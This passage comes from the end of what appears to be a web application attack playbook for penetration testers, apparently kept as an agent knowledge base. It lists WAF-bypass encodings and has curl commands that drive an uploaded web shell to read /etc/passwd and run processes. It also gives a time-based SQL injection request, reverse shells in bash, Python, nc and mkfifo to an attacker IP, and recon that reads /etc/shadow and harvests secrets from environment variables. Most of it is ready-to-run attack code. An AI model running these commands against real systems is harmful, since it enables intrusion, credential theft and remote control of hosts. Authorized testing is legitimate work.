   %3C = <     %3E = >     %28 = (     %29 = )

4. Double URL encoding
   %2527 = %27 = '    (bypasses single-layer decode)

5. HTML entity encoding
   &#x27; = '    &#60; = <    &#x22; = "

6. Unicode normalization
   ＜script＞ (fullwidth chars, normalize to <script>)

7. Comment injection (SQL)
   SEL/**/ECT    UN/**/ION SEL/**/ECT

8. Null bytes
   %00 (some parsers truncate at null)

9. Chunked Transfer-Encoding
   Split payload across multiple chunks

10. Parameter pollution
    ?id=1&id=1 UNION SELECT...
    (Some WAFs only check last or first occurrence)
```

---

## Appendix D: Evidence Collection Standards

For every confirmed finding, collect the following before cleanup:

```bash
# 1. HTTP Request (Burp Suite — save as text or screenshot)
# 2. HTTP Response showing vulnerability triggered
# 3. Command output proof (id, whoami, hostname, date)
# 4. Timestamps (UTC)
# 5. Screenshot at point of exploitation

# Standard evidence directory structure
mkdir -p $OUTPUT_DIR/{screenshots,requests,command-output,logs}

# Save command execution proof
curl "$TARGET_URL/upload/shell.php?cmd=id" | tee $OUTPUT_DIR/command-output/id-proof.txt
curl "$TARGET_URL/upload/shell.php?cmd=hostname" | tee $OUTPUT_DIR/command-output/hostname-proof.txt
curl "$TARGET_URL/upload/shell.php?cmd=whoami" | tee $OUTPUT_DIR/command-output/whoami-proof.txt
curl "$TARGET_URL/upload/shell.php?cmd=cat+/etc/passwd" | tee $OUTPUT_DIR/command-output/passwd-proof.txt
curl "$TARGET_URL/upload/shell.php?cmd=ip+addr" | tee $OUTPUT_DIR/command-output/network-proof.txt
curl "$TARGET_URL/upload/shell.php?cmd=ps+aux" | tee $OUTPUT_DIR/command-output/process-proof.txt

# Save SQL injection evidence
curl "$TARGET_URL/page?id=1%27%20AND%20SLEEP(5)--" -o $OUTPUT_DIR/sqli-time-proof.txt
# Note: response time in evidence

# Cleanup — remove web shells after confirmation
curl "$TARGET_URL/upload/shell.php?cmd=rm+/var/www/html/uploads/shell.php"
```

---

## Appendix E: Post-Exploitation Quick Reference

Once command execution is confirmed, pivot to full shell:

```bash
# Establish reverse shell from web shell
# Listener:
nc -lvnp 4444

# Bash reverse shell (via webshell cmd parameter)
?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$ATTACKER_IP/4444+0>%261'

# Python reverse shell
?cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# nc reverse shell (if nc has -e)
?cmd=nc+$ATTACKER_IP+4444+-e+/bin/sh

# mkfifo reverse shell (no -e nc)
?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+$ATTACKER_IP+4444+>/tmp/f

# Upgrade to PTY shell (once reverse shell received)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg

# Internal recon from shell
id && whoami
hostname
ip addr
cat /etc/passwd
cat /etc/shadow
env | grep -E '(KEY|TOKEN|SECRET|PASS|AWS|DB)'
ls -la /var/www/html/
find / -name "*.config" -o -name ".env" 2>/dev/null | head -20
ps aux
netstat -tulpn
cat /etc/crontab
```

---

*End of ATHENA Web Application Attack Playbook*
*Version: 1.0 | Date: 2026-02-26 | Classification: RESTRICTED*
*Sources: PayloadsAllTheThings (MIT), HackTricks, PortSwigger, OWASP*
*Maintained by: ATHENA Agent Knowledge System*
